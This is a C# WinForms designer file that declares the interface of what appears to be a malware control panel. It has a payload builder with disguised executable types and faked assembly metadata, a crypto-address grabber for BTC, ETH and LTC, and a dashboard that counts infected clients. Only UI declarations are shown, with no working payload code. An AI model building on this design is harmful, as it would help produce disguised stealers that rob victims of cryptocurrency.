        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties9 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties10 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties11 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties12 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties13 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties14 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties15 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties16 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties17 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties18 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties19 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties20 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties21 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties22 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties23 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties24 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties25 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties26 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties27 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties28 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties29 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties30 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties31 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties32 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties33 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties34 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties35 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties36 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties37 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties38 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties39 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties40 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties41 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties42 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties43 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties44 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties45 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties46 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties47 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties48 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties49 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties50 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties51 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties52 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties53 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties54 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties55 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties56 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties57 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties58 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties59 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties60 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation2 = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties61 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties62 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties63 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties64 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties65 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties66 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties67 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties68 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties69 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties70 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties71 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties72 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties73 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties74 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties75 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties76 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties77 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties78 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties79 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties80 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties81 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties82 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties83 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties84 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties85 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties86 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties87 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties88 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties89 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties90 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties91 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties92 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties93 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties94 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties95 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties96 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties97 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties98 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties99 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties100 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties101 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties102 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties103 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties104 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties105 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties106 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties107 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties108 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties109 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties110 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties111 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties112 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties113 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties114 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties115 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties116 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties117 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties118 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties119 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties120 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties121 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties122 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties123 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties124 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle21 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle22 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle24 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle23 = new System.Windows.Forms.DataGridViewCellStyle();
        Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges1 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation3 = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation4 = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation5 = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        this.panelForm = new System.Windows.Forms.Panel();
        this.MunePanelProfile = new System.Windows.Forms.Panel();
        this.TabMune = new Bunifu.UI.WinForms.BunifuPages();
        this.tabPage1Builder = new System.Windows.Forms.TabPage();
        this.PanelMuneBuilder = new System.Windows.Forms.Panel();
        this.MuneCloseBuilder = new System.Windows.Forms.Label();
        this.TitleMuneBuilder = new Bunifu.UI.WinForms.BunifuLabel();
        this.PanelBrowserIcon = new System.Windows.Forms.Panel();
        this.BrowserIcon = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PanelAssemplyInfo = new System.Windows.Forms.Panel();
        this.BuilderTitleAssembly = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderDescriptionsAssembly = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderCopyrightAssembly = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderCompanyAssembly = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderTrademarksAssembly = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Vr1 = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Vr2 = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Vr3 = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Vr4 = new Bunifu.UI.WinForms.BunifuTextBox();
        this.guna2GradientButton_2 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.Payloadname = new Bunifu.UI.WinForms.BunifuTextBox();
        this.label26 = new System.Windows.Forms.Label();
        this.SaveProperties = new Guna.UI2.WinForms.Guna2GradientButton();
        this.SaveSettings = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.BuilderChackIcon = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label25 = new System.Windows.Forms.Label();
        this.bunifuDatePicker1 = new Bunifu.UI.WinForms.BunifuDatePicker();
        this.BuilderDatemodified = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label24 = new System.Windows.Forms.Label();
        this.BuilderAssemblyinformation = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label23 = new System.Windows.Forms.Label();
        this.label22 = new System.Windows.Forms.Label();
        this.SCR = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.label20 = new System.Windows.Forms.Label();
        this.label21 = new System.Windows.Forms.Label();
        this.CMD = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.PIF = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.label18 = new System.Windows.Forms.Label();
        this.label19 = new System.Windows.Forms.Label();
        this.EXE = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.COM = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.NameIcon = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageIcon = new Bunifu.UI.WinForms.BunifuPictureBox();
        this.tabPage2Monitor = new System.Windows.Forms.TabPage();
        this.PanelMuneMonitor = new System.Windows.Forms.Panel();
        this.label30 = new System.Windows.Forms.Label();
        this.label29 = new System.Windows.Forms.Label();
        this.DelayMonitor = new Bunifu.UI.WinForms.BunifuTextBox();
        this.CloseMuneMonitor = new System.Windows.Forms.Label();
        this.label17 = new System.Windows.Forms.Label();
        this.ScanActiveAddresses = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.pictureBox11 = new System.Windows.Forms.PictureBox();
        this.TlogCurrencyGrabber = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label16 = new System.Windows.Forms.Label();
        this.SaveMonitorData = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PanelMonitorGrabber = new System.Windows.Forms.Panel();
        this.TextBTC = new Bunifu.UI.WinForms.BunifuTextBox();
        this.TextETH = new Bunifu.UI.WinForms.BunifuTextBox();
        this.TextLTC = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PanelListScan = new System.Windows.Forms.Panel();
        this.ListScanActiveAddresses = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ScanTitle = new Bunifu.UI.WinForms.BunifuTextBox();
        this.TitleMuneMonitor = new Bunifu.UI.WinForms.BunifuLabel();
        this.tabPage3 = new System.Windows.Forms.TabPage();
        this.PanelProfile = new System.Windows.Forms.Panel();
        this.MuneCloseProfile = new System.Windows.Forms.Label();
        this.TitleMuneProfile = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuPanel19 = new Bunifu.UI.WinForms.BunifuPanel();
        this.ImageMuneGood = new System.Windows.Forms.PictureBox();
        this.ImageMuneError = new System.Windows.Forms.PictureBox();
        this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
        this.guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
        this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
        this.bunifuLabel74 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel67 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ValueMunePerformince = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel71 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProfileDate = new Bunifu.UI.WinForms.BunifuLabel();
        this.BrowserLogo = new Guna.UI2.WinForms.Guna2GradientButton();
        this.LevelProfile = new Guna.UI2.WinForms.Guna2RatingStar();
        this.bunifuLabel_2 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProfileUsername = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageProfileMune = new Guna.UI2.WinForms.Guna2CircleProgressBar();
        this.guna2CircleButton_0 = new Guna.UI2.WinForms.Guna2CircleButton();
        this.PanelResizeForm = new System.Windows.Forms.Panel();
        this.PageForm = new Bunifu.UI.WinForms.BunifuPages();
        this.Page1 = new System.Windows.Forms.TabPage();
        this.PanelDashboard = new System.Windows.Forms.Panel();
        this.bunifuGradientPanel2 = new Bunifu.UI.WinForms.BunifuGradientPanel();
        this.label6 = new System.Windows.Forms.Label();
        this.bunifuSeparator3 = new Bunifu.UI.WinForms.BunifuSeparator();
        this.ListDashboard = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn13 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.bunifuGradientPanel3 = new Bunifu.UI.WinForms.BunifuGradientPanel();
        this.pictureBox9 = new System.Windows.Forms.PictureBox();
        this.CountReceivedData = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProgressBarReceivedData = new Guna.UI2.WinForms.Guna2CircleProgressBar();
        this.bunifuLabel95 = new Bunifu.UI.WinForms.BunifuLabel();
        this.CountSentData = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProgressBarDataSent = new Guna.UI2.WinForms.Guna2CircleProgressBar();
        this.bunifuLabel14 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuPanel5 = new Bunifu.UI.WinForms.BunifuPanel();
        this.CountSessionMonitor = new Bunifu.UI.WinForms.BunifuLabel();
        this.guna2GradientButton_0 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.label3 = new System.Windows.Forms.Label();
        this.bunifuPanel11 = new Bunifu.UI.WinForms.BunifuPanel();
        this.CountGrabber = new Bunifu.UI.WinForms.BunifuLabel();
        this.guna2GradientButton_1 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.label4 = new System.Windows.Forms.Label();
        this.bunifuGradientPanel1 = new Bunifu.UI.WinForms.BunifuGradientPanel();
        this.guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
        this.label5 = new System.Windows.Forms.Label();
        this.label11 = new System.Windows.Forms.Label();
        this.CountClients = new System.Windows.Forms.Label();
        this.CountDesconnect = new Bunifu.UI.WinForms.BunifuLabel();
        this.CountNewClient = new Bunifu.UI.WinForms.BunifuLabel();
        this.label8 = new System.Windows.Forms.Label();
        this.guna2Button5 = new Guna.UI2.WinForms.Guna2Button();
        this.guna2Button6 = new Guna.UI2.WinForms.Guna2Button();
        this.bunifuLabel16 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel35 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuPanel4 = new Bunifu.UI.WinForms.BunifuPanel();
        this.bunifuLabel_0 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel125 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel126 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProgressBarWin11 = new Bunifu.UI.WinForms.BunifuProgressBar();
        this.bunifuPanel3 = new Bunifu.UI.WinForms.BunifuPanel();
        this.bunifuLabel_1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel122 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel123 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProgressBarWin10 = new Bunifu.UI.WinForms.BunifuProgressBar();
        this.bunifuPanel2 = new Bunifu.UI.WinForms.BunifuPanel();
        this.CountWin7 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel33 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel120 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProgressBarWin7 = new Bunifu.UI.WinForms.BunifuProgressBar();
        this.bunifuPanel6 = new Bunifu.UI.WinForms.BunifuPanel();
        this.CountWinXP = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel128 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel129 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProgressBarWinXP = new Bunifu.UI.WinForms.BunifuProgressBar();
        this.bunifuPanel1 = new Bunifu.UI.WinForms.BunifuPanel();
        this.TimeME = new Bunifu.UI.WinForms.BunifuLabel();
        this.LeavelDashboard = new Guna.UI2.WinForms.Guna2RatingStar();
        this.UsageCPU = new Bunifu.UI.WinForms.BunifuLabel();
        this.MesgWelcome = new System.Windows.Forms.Label();
        this.bunifuLabel31 = new Bunifu.UI.WinForms.BunifuLabel();
        this.pictureBox8 = new System.Windows.Forms.PictureBox();
